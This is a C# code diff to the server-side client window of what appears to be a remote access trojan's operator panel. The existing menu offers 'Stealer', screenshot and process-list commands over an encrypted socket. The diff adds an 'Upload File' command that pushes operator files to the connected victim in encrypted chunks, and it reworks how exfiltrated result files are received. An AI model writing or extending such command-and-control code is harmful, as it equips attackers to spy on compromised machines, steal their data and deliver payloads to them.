@@ -11,6 +11,7 @@ using System.Text;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Windows.Forms.VisualStyles;
+using static System.Windows.Forms.VisualStyles.VisualStyleElement.ProgressBar;
 
 namespace Server_side
 {
@@ -20,7 +21,7 @@ namespace Server_side
         private Socket clientSocket;
         private string passPhrase;
         private Encryptor encryptor;
-
+        private string delimiter = "|;|";
         public ClientInfo(string clientIP, string clientHostname, string connectTime, string clientOS)
         {
             InitializeComponent();
@@ -46,6 +47,7 @@ namespace Server_side
             cmdComboBox.Items.Add("Get Screenshot");
             cmdComboBox.Items.Add("Get ProcessList");
             cmdComboBox.Items.Add("Stealer");
+            cmdComboBox.Items.Add("Upload File");
             cmdComboBox.Items.Add("Exit");
             cmdComboBox.SelectedIndex = 0;
 
@@ -86,7 +88,6 @@ namespace Server_side
 
         private void sendCommandBtn_Click(object sender, EventArgs e)
         {
-            string delimiter = "|;|";
             string command = $"1{delimiter}{commandBox.Text}";
 
             keyLabel.Text = encryptor.GetKey();
@@ -108,6 +109,11 @@ namespace Server_side
 
         private void logging(string log)
         {
+            if (log == null)
+            {
+                return;
+            }
+
             string[] parts = log.Split("|---|");
             string boldText = $"{parts[0]}: ";
             // Set bold text to blue color
@@ -131,8 +137,7 @@ namespace Server_side
 
         private void sendCommandBtn1_Click(object sender, EventArgs e)
         {
-            string delimiter = "|;|";
-            string placeholder = "";
+            string placeholder;
             switch (cmdComboBox.SelectedIndex)
             {
                 case 0:
@@ -240,7 +245,7 @@ namespace Server_side
                         }
                         catch (Exception ex)
                         {
-                            logging("Error displaying image: " + ex.Message);
+                            logging("Error displaying image");
                             MessageBox.Show("Error displaying image: " + ex.Message);
                         }
                         break;
@@ -255,7 +260,7 @@ namespace Server_side
                         logging("Command sent|---|" + cmdComboBox.Text);
 
                         // Receive response
-                        byte[] response = GetResultFile(false);
+                        byte[]? response = GetResultFile(false);
                         logging("Response received|---|" + Encoding.UTF8.GetString(response));
 
                         MessageBox.Show("Process list received successfully.", "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
@@ -291,6 +296,28 @@ namespace Server_side
                     }
                 case 6:
                     {
+                        placeholder = localfileBox.Text;
+                        if (string.IsNullOrEmpty(placeholder))
+                        {
+                            MessageBox.Show("Please enter a file path.", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                            return;
+                        }
+                        string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
+                        byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
+                        NetworkLayer.Send(clientSocket, encryptedCommand);
+
+                        logging("Command sent|---|" + cmdComboBox.Text);
+
+                        SendFile().Wait();
+
+                        byte[] response = NetworkLayer.ReceiveResult(clientSocket);
+                        string decryptedResponse = encryptor.Decrypt(response);
+                        logging("Response received|---|" + decryptedResponse);
+
+                        break;
+                    }
+                case 7:
+                    {
                         placeholder = "exit";
                         string command = $"{cmdComboBox.SelectedIndex + 2}{delimiter}{placeholder}";
                         byte[] encryptedCommand = encryptor.Encrypt(command.Trim());
@@ -312,7 +339,6 @@ namespace Server_side
 
         private byte[]? GetResultFile(bool saved)
         {
-            string delimiter = "|;|";
             byte[] received = NetworkLayer.ReceiveResult(clientSocket);
             string decrypted = encryptor.Decrypt(received);
             string[] parts = decrypted.Split(delimiter);
@@ -323,31 +349,47 @@ namespace Server_side
 
             logging($"File received|---|{fileName}_{guid}_{chunkCount}");
 
+            List<string> tempChunks = new List<string>();
             ConcurrentDictionary<int, string> chunks = new ConcurrentDictionary<int, string>();
 
-            List<Task> tasks = new List<Task>();
+            string endSignal = "<END - EOF>";
 
-            for (int i = 0; i < chunkCount; i++)
+            while (true)
             {
-                tasks.Add(Task.Run(() =>
+                byte[] chunk = NetworkLayer.ReceiveResult(clientSocket);
+                string chunkDecrypted = encryptor.Decrypt(chunk);
+
+                if (chunkDecrypted.Contains(endSignal))
                 {
-                    byte[] chunk = NetworkLayer.ReceiveResult(clientSocket);
-                    string chunkDecrypted = encryptor.Decrypt(chunk);
-                    string[] chunkParts = chunkDecrypted.Split(delimiter);
-                    string chunkGuid = chunkParts[0];
-                    int chunkIndex = int.Parse(chunkParts[2]);
+                    break;
+                }
 
-                    if (chunkGuid != guid)
+                string[] chunkParts = chunkDecrypted.Split(delimiter);
+                if (chunkParts.Length >= 3)
+                {
+                    int chunkIndex;
+                    if (int.TryParse(chunkParts[2], out chunkIndex))
                     {
-                        MessageBox.Show("Error in GetResultFile: GUID mismatch", guid);
-                        throw new InvalidOperationException("GUID mismatch");
+                        string chunkData = chunkParts[1];
+                        tempChunks.Add(chunkDecrypted);
+                        chunks.TryAdd(chunkIndex, chunkData);
                     }
-
-                    chunks[chunkIndex] = chunkParts[1];
-                }));
+                    else
+                    {
+                        MessageBox.Show($"Error in parsing chunk index: {chunkDecrypted}");
+                    }
+                }
+                else
+                {
+                    MessageBox.Show($"Error in chunk format: {chunkDecrypted}");
+                }
             }
 
-            Task.WaitAll(tasks.ToArray());
+            if (chunks.Count != chunkCount)
+            {
+                MessageBox.Show("Error in GetResultFile: Chunk count mismatch", $"{chunks.Count} != {chunkCount}");
+                return Encoding.UTF8.GetBytes("Error in GetResultFile: Chunk count mismatch");
+            }
 
             string fileBase64 = string.Join("", chunks.OrderBy(kv => kv.Key).Select(kv => kv.Value));
             byte[] fileData = Encryptor.InvertStr(fileBase64);
@@ -364,9 +406,139 @@ namespace Server_side
             return fileData;
         }
 
+        private async Task SendFile()
+        {
+            byte[] fileContent;
+            int MaxChunkSize = 4096;
+            int counter = 0;
+            List<Task> tasks = new();
+            SemaphoreSlim semaphore = new SemaphoreSlim(50);
+            try
+            {
+                fileContent = File.ReadAllBytes(localfileBox.Text);
+                string fileContent64 = Encryptor.ConvertStr(fileContent);
+                string fileID = Guid.NewGuid().ToString();
+                string fileName = Path.GetFileName(localfileBox.Text);
+                int chunkCount = (int)Math.Ceiling((double)fileContent64.Length / MaxChunkSize);
+                // Send file ID, chunk count and file name
+                string fileHeader = $"{fileID}{delimiter}{chunkCount}{delimiter}{fileName}{delimiter}";
+                byte[] encryptedHeader = encryptor.Encrypt(fileHeader);
+                NetworkLayer.Send(clientSocket, encryptedHeader);
+
+                // Send file content
+                for (int i = 0; i < fileContent64.Length; i += MaxChunkSize)
+                {
+                    int currentCounter = counter;
+                    await semaphore.WaitAsync();
+                    var chunk = fileContent64.Substring(i, Math.Min(MaxChunkSize, fileContent64.Length - i));
+                    Task task = Task.Run(async () =>
+                    {
+                        try
+                        {
+                            string formattedChunk = $"{fileID}{delimiter}{chunk}{delimiter}{currentCounter}{delimiter}";
+                            byte[] encryptedChunk = encryptor.Encrypt(formattedChunk);
+                            NetworkLayer.Send(clientSocket, encryptedChunk);
+                            await Task.Delay(200);
+                        }
+                        finally
+                        {
+                            semaphore.Release();
+                        }
+                    });
+                    counter++;
+                }
+
+                await Task.WhenAll(tasks.ToArray());
+            }
+            catch (Exception e)
+            {
+                MessageBox.Show(e.Message);
+                return;
+            }
+        }
+
+        private void cmdComboBox_SelectedIndexChanged(object sender, EventArgs e)
+        {
+            switch (cmdComboBox.SelectedIndex)
+            {
+                case 0:
+                    {
+                        agentfileBox.Enabled = true;
+                        pidBox.Enabled = false;
+                        localfileBox.Enabled = false;
+                        break;
+                    }
+                case 1:
+                    {
+                        agentfileBox.Enabled = false;
+                        pidBox.Enabled = false;
+                        localfileBox.Enabled = false;
+                        break;
+                    }
+                case 2:
+                    {
+                        agentfileBox.Enabled = false;
+                        pidBox.Enabled = true;
+                        localfileBox.Enabled = false;
+                        break;
+                    }
+                case 3:
+                    {
+                        agentfileBox.Enabled = false;
+                        pidBox.Enabled = false;
+                        localfileBox.Enabled = false;
+                        break;
+                    }
+                case 4:
+                    {
+                        agentfileBox.Enabled = false;
+                        pidBox.Enabled = false;
+                        localfileBox.Enabled = false;
+                        break;
+                    }
+                case 5:
+                    {
+                        agentfileBox.Enabled = false;
+                        pidBox.Enabled = false;
+                        localfileBox.Enabled = false;
+                        break;
+                    }
+                case 6:
+                    {
+                        agentfileBox.Enabled = false;
+                        pidBox.Enabled = false;
+                        localfileBox.Enabled = true;
+                        break;
+                    }
+                case 7:
+                    {
+                        agentfileBox.Enabled = false;
+                        pidBox.Enabled = false;
+                        localfileBox.Enabled = false;
+                        break;
+                    }
+            }
+        }
+
         private void clearLogBtn_Click(object sender, EventArgs e)
         {
             agentLogBox.Clear();
+        }
+
+        private void fileChooseBtn_Click(object sender, EventArgs e)
+        {
+            OpenFileDialog dialog = new OpenFileDialog();
+            dialog.Filter = "All files (*.*)|*.*";
+            dialog.Title = "Select a file";
+            dialog.Multiselect = false;
+            dialog.CheckFileExists = true;
+            dialog.CheckPathExists = true;
+            dialog.ShowDialog();
+
+            if (!string.IsNullOrEmpty(dialog.FileName))
+            {
+                localfileBox.Text = dialog.FileName;
+            }
         }
     }
 
